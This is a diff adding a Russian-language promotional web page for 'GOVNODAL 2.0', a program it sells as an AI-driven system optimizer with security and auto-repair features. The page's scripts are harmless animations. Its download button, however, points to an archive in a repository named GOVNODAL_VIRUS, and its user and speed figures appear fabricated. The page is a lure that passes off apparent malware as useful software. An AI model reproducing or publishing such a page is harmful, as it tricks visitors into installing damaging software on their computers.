@@ -1,0 +1,518 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>GOVNODAL 2.0 - Революция в мире ПО</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: linear-gradient(135deg, #1a1a2e, #16213e, #0f3460);
+            color: white;
+            overflow-x: hidden;
+            min-height: 100vh;
+        }
+
+        .container {
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 0 20px;
+        }
+
+        /* Header */
+        header {
+            padding: 2rem 0;
+            position: relative;
+            z-index: 10;
+        }
+
+        .logo {
+            display: flex;
+            align-items: center;
+            gap: 1rem;
+            font-size: 2.5rem;
+            font-weight: bold;
+            margin-bottom: 1rem;
+        }
+
+        .logo-emoji {
+            animation: float 3s ease-in-out infinite;
+        }
+
+        .tagline {
+            font-size: 1.2rem;
+            opacity: 0.8;
+            margin-bottom: 2rem;
+        }
+
+        /* Hero Section */
+        .hero {
+            text-align: center;
+            padding: 4rem 0;
+            position: relative;
+        }
+
+        .hero h1 {
+            font-size: 4rem;
+            margin-bottom: 1rem;
+            background: linear-gradient(45deg, #ff6b6b, #ffd93d, #6bcf7f);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+            animation: glow 2s ease-in-out infinite alternate;
+        }
+
+        .hero p {
+            font-size: 1.5rem;
+            margin-bottom: 3rem;
+            opacity: 0.9;
+        }
+
+        /* Download Button */
+        .download-btn {
+            display: inline-block;
+            padding: 1.5rem 3rem;
+            font-size: 1.5rem;
+            font-weight: bold;
+            text-decoration: none;
+            background: linear-gradient(45deg, #ff6b6b, #ffd93d);
+            color: #1a1a2e;
+            border-radius: 50px;
+            transition: all 0.3s ease;
+            animation: pulse 2s infinite;
+            box-shadow: 0 10px 30px rgba(255, 107, 107, 0.3);
+            position: relative;
+            overflow: hidden;
+        }
+
+        .download-btn:hover {
+            transform: translateY(-5px);
+            box-shadow: 0 15px 40px rgba(255, 107, 107, 0.5);
+            animation: none;
+        }
+
+        .download-btn:active {
+            transform: translateY(0);
+        }
+
+        .btn-text {
+            position: relative;
+            z-index: 2;
+        }
+
+        .btn-glow {
+            position: absolute;
+            top: 0;
+            left: -100%;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(90deg, transparent, rgba(255,255,255,0.4), transparent);
+            transition: left 0.5s;
+        }
+
+        .download-btn:hover .btn-glow {
+            left: 100%;
+        }
+
+        /* Features */
+        .features {
+            padding: 4rem 0;
+        }
+
+        .features-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
+            gap: 2rem;
+            margin-top: 3rem;
+        }
+
+        .feature-card {
+            background: rgba(255, 255, 255, 0.1);
+            padding: 2rem;
+            border-radius: 20px;
+            backdrop-filter: blur(10px);
+            border: 1px solid rgba(255, 255, 255, 0.2);
+            transition: transform 0.3s ease, box-shadow 0.3s ease;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .feature-card:hover {
+            transform: translateY(-10px);
+            box-shadow: 0 20px 40px rgba(0, 0, 0, 0.3);
+        }
+
+        .feature-card::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            height: 3px;
+            background: linear-gradient(45deg, #ff6b6b, #ffd93d, #6bcf7f);
+        }
+
+        .feature-icon {
+            font-size: 3rem;
+            margin-bottom: 1rem;
+        }
+
+        .feature-card h3 {
+            font-size: 1.5rem;
+            margin-bottom: 1rem;
+        }
+
+        /* Animations */
+        @keyframes float {
+            0%, 100% { transform: translateY(0px); }
+            50% { transform: translateY(-20px); }
+        }
+
+        @keyframes glow {
+            from { text-shadow: 0 0 20px rgba(255, 107, 107, 0.5); }
+            to { text-shadow: 0 0 30px rgba(255, 215, 61, 0.5), 0 0 40px rgba(107, 207, 127, 0.3); }
+        }
+
+        @keyframes pulse {
+            0%, 100% { transform: scale(1); }
+            50% { transform: scale(1.05); }
+        }
+
+        @keyframes slideIn {
+            from { transform: translateY(50px); opacity: 0; }
+            to { transform: translateY(0); opacity: 1; }
+        }
+
+        /* Particles */
+        .particles {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            pointer-events: none;
+            z-index: 1;
+        }
+
+        .particle {
+            position: absolute;
+            background: rgba(255, 255, 255, 0.5);
+            border-radius: 50%;
+            animation: float 6s infinite ease-in-out;
+        }
+
+        /* Stats */
+        .stats {
+            padding: 4rem 0;
+            text-align: center;
+        }
+
+        .stats-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
+            gap: 2rem;
+            margin-top: 3rem;
+        }
+
+        .stat-item {
+            background: rgba(255, 255, 255, 0.05);
+            padding: 2rem;
+            border-radius: 15px;
+            border: 1px solid rgba(255, 255, 255, 0.1);
+        }
+
+        .stat-number {
+            font-size: 3rem;
+            font-weight: bold;
+            background: linear-gradient(45deg, #ff6b6b, #ffd93d);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+        }
+
+        /* Footer */
+        footer {
+            padding: 2rem 0;
+            text-align: center;
+            border-top: 1px solid rgba(255, 255, 255, 0.1);
+            margin-top: 4rem;
+        }
+
+        .warning {
+            background: rgba(255, 107, 107, 0.1);
+            padding: 1rem;
+            border-radius: 10px;
+            border-left: 4px solid #ff6b6b;
+            margin: 2rem 0;
+        }
+
+        /* Responsive */
+        @media (max-width: 768px) {
+            .hero h1 {
+                font-size: 2.5rem;
+            }
+            
+            .hero p {
+                font-size: 1.2rem;
+            }
+            
+            .download-btn {
+                padding: 1rem 2rem;
+                font-size: 1.2rem;
+            }
+            
+            .logo {
+                font-size: 2rem;
+            }
+        }
+
+        /* Loading Animation */
+        .loading-bar {
+            width: 0%;
+            height: 4px;
+            background: linear-gradient(45deg, #ff6b6b, #ffd93d);
+            position: fixed;
+            top: 0;
+            left: 0;
+            z-index: 1000;
+            transition: width 0.3s ease;
+        }
+    </style>
+</head>
+<body>
+    <div class="loading-bar" id="loadingBar"></div>
+    
+    <div class="particles" id="particles"></div>
+    
+    <div class="container">
+        <header>
+            <div class="logo">
+                <span class="logo-emoji">💩</span>
+                <span>GOVNODAL 2.0</span>
+            </div>
+            <div class="tagline">Революция в мире программного обеспечения</div>
+        </header>
+
+        <section class="hero">
+            <h1>GOVNODAL 2.0</h1>
+            <p>Самый передовой софт для оптимизации вашей системы</p>
+            <a href="https://github.com/vorobjewsen30-max/GOVNODAL_VIRUS/archive/refs/heads/main.zip" class="download-btn" id="downloadBtn">
+                <span class="btn-text">🚀 СКАЧАТЬ БЕСПЛАТНО</span>
+                <span class="btn-glow"></span>
+            </a>
+            
+            <div class="warning">
+                ⚠️ Внимание: Программа содержит продвинутые функции оптимизации. 
+                Рекомендуется для опытных пользователей.
+            </div>
+        </section>
+
+        <section class="features">
+            <h2 style="text-align: center; font-size: 2.5rem; margin-bottom: 1rem;">Возможности GOVNODAL 2.0</h2>
+            <p style="text-align: center; font-size: 1.2rem; opacity: 0.8; margin-bottom: 3rem;">
+                Инновационные технологии для вашего компьютера
+            </p>
+            
+            <div class="features-grid">
+                <div class="feature-card">
+                    <div class="feature-icon">⚡</div>
+                    <h3>Мгновенное ускорение</h3>
+                    <p>Оптимизация системы в реальном времени с использованием AI-алгоритмов</p>
+                </div>
+                
+                <div class="feature-card">
+                    <div class="feature-icon">🛡️</div>
+                    <h3>Повышенная безопасность</h3>
+                    <p>Защита от угроз с помощью продвинутых эвристических методов</p>
+                </div>
+                
+                <div class="feature-card">
+                    <div class="feature-icon">🎯</div>
+                    <h3>Точная настройка</h3>
+                    <p>Автоматическая оптимизация под ваше железо и софт</p>
+                </div>
+                
+                <div class="feature-card">
+                    <div class="feature-icon">🚀</div>
+                    <h3>GOVNO_DISK</h3>
+                    <p>Инновационная файловая система для максимальной производительности</p>
+                </div>
+                
+                <div class="feature-card">
+                    <div class="feature-icon">🔧</div>
+                    <h3>Авто-ремонт</h3>
+                    <p>Автоматическое исправление системных ошибок и конфликтов</p>
+                </div>
+                
+                <div class="feature-card">
+                    <div class="feature-icon">📊</div>
+                    <h3>Детальная аналитика</h3>
+                    <p>Подробные отчеты о работе системы и рекомендации</p>
+                </div>
+            </div>
+        </section>
+
+        <section class="stats">
+            <h2 style="text-align: center; font-size: 2.5rem; margin-bottom: 1rem;">GOVNODAL в цифрах</h2>
+            <div class="stats-grid">
+                <div class="stat-item">
+                    <div class="stat-number" id="usersCount">0</div>
+                    <div>Довольных пользователей</div>
+                </div>
+                <div class="stat-item">
+                    <div class="stat-number" id="speedCount">0%</div>
+                    <div>Средний прирост скорости</div>
+                </div>
+                <div class="stat-item">
+                    <div class="stat-number" id="systemsCount">0</div>
+                    <div>Оптимизированных систем</div>
+                </div>
+                <div class="stat-item">
+                    <div class="stat-number" id="uptimeCount">0</div>
+                    <div>Дней стабильной работы</div>
+                </div>
+            </div>
+        </section>
+
+        <footer>
+            <p>© 2024 GOVNODAL 2.0. Все права защищены. Программа предназначена для образовательных целей.</p>
+            <p style="margin-top: 1rem; opacity: 0.7;">
+                Используйте с осторожностью. Рекомендуется создание точки восстановления системы.
+            </p>
+        </footer>
+    </div>
+
+    <script>
+        // Create particles
+        function createParticles() {
+            const particlesContainer = document.getElementById('particles');
+            const particleCount = 50;
+            
+            for (let i = 0; i < particleCount; i++) {
+                const particle = document.createElement('div');
+                particle.className = 'particle';
+                
+                const size = Math.random() * 5 + 2;
+                const posX = Math.random() * 100;
+                const posY = Math.random() * 100;
+                const delay = Math.random() * 5;
+                const duration = Math.random() * 10 + 10;
+                
+                particle.style.width = `${size}px`;
+                particle.style.height = `${size}px`;
+                particle.style.left = `${posX}%`;
+                particle.style.top = `${posY}%`;
+                particle.style.animationDelay = `${delay}s`;
+                particle.style.animationDuration = `${duration}s`;
+                particle.style.opacity = Math.random() * 0.5 + 0.1;
+                
+                particlesContainer.appendChild(particle);
+            }
+        }
+
+        // Animate numbers
+        function animateNumbers() {
+            const users = document.getElementById('usersCount');
+            const speed = document.getElementById('speedCount');
+            const systems = document.getElementById('systemsCount');
+            const uptime = document.getElementById('uptimeCount');
+            
+            animateValue(users, 0, 15427, 2000);
+            animateValue(speed, 0, 247, 2000);
+            animateValue(systems, 0, 8923, 2000);
+            animateValue(uptime, 0, 365, 2000);
+        }
+        
+        function animateValue(element, start, end, duration) {
+            let startTimestamp = null;
+            const step = (timestamp) => {
+                if (!startTimestamp) startTimestamp = timestamp;
+                const progress = Math.min((timestamp - startTimestamp) / duration, 1);
+                const value = Math.floor(progress * (end - start) + start);
+                
+                if (element === speed) {
+                    element.innerHTML = value + '%';
+                } else {
+                    element.innerHTML = value.toLocaleString();
+                }
+                
+                if (progress < 1) {
+                    window.requestAnimationFrame(step);
+                }
+            };
+            window.requestAnimationFrame(step);
+        }
+
+        // Download button animation
+        document.getElementById('downloadBtn').addEventListener('click', function(e) {
+            const loadingBar = document.getElementById('loadingBar');
+            loadingBar.style.width = '100%';
+            
+            setTimeout(() => {
+                loadingBar.style.width = '0%';
+            }, 2000);
+        });
+
+        // Intersection Observer for animations
+        const observerOptions = {
+            threshold: 0.1,
+            rootMargin: '0px 0px -50px 0px'
+        };
+
+        const observer = new IntersectionObserver((entries) => {
+            entries.forEach(entry => {
+                if (entry.isIntersecting) {
+                    entry.target.style.animation = 'slideIn 0.8s ease-out forwards';
+                }
+            });
+        }, observerOptions);
+
+        // Initialize
+        document.addEventListener('DOMContentLoaded', function() {
+            createParticles();
+            animateNumbers();
+            
+            // Observe feature cards for animation
+            document.querySelectorAll('.feature-card').forEach(card => {
+                observer.observe(card);
+            });
+            
+            // Observe stat items for animation
+            document.querySelectorAll('.stat-item').forEach(stat => {
+                observer.observe(stat);
+            });
+        });
+
+        // Add some interactive effects
+        document.querySelectorAll('.feature-card').forEach(card => {
+            card.addEventListener('mouseenter', function() {
+                this.style.transform = 'translateY(-10px) scale(1.02)';
+            });
+            
+            card.addEventListener('mouseleave', function() {
+                this.style.transform = 'translateY(0) scale(1)';
+            });
+        });
+
+        // Background animation
+        function updateBackground() {
+            const hue = (Date.now() / 20000) % 360;
+            document.body.style.background = `
+                linear-gradient(135deg, 
+                    hsl(${hue}, 70%, 15%), 
+                    hsl(${(hue + 60) % 360}, 70%, 20%), 
+                    hsl(${(hue + 120) % 360}, 70%, 12%))
+            `;
+            requestAnimationFrame(updateBackground);
+        }
+        
+        updateBackground();
+    </script>
+</body>
+</html>
